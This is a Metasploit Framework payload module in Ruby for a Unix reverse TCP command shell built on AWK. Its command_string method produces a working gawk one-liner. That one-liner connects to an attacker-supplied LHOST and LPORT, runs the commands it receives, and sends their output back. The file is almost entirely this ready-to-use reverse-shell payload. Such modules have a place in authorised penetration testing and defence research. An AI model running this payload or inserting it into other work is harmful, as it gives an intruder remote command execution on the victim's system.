##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Unix Command Shell, Reverse TCP (via AWK)',
			'Description'   => 'Creates an interactive shell via AWK',
			'Author'        => 
				[
					'espreto <robertoespreto[at]gmail.com>',
					'Ulisses Castro <uss.thebug[at]gmail.com>',
					'Gabriel Quadros <gquadrossilva[at]gmail.com>'
				],
			'License'       => MSF_LICENSE,
			'Platform'      => 'unix',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'RequiredCmd'   => 'gawk',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		return super + command_string
	end

	#
	# Returns the command string to use for execution
	#
	def command_string
		"awk 'BEGIN{for(s=\"/inet/tcp/0/#{datastore['LHOST']}/#{datastore['LPORT']}\";s|&getline c;close(c)){while(c|& getline)print $0|& s}}'"
	end

end
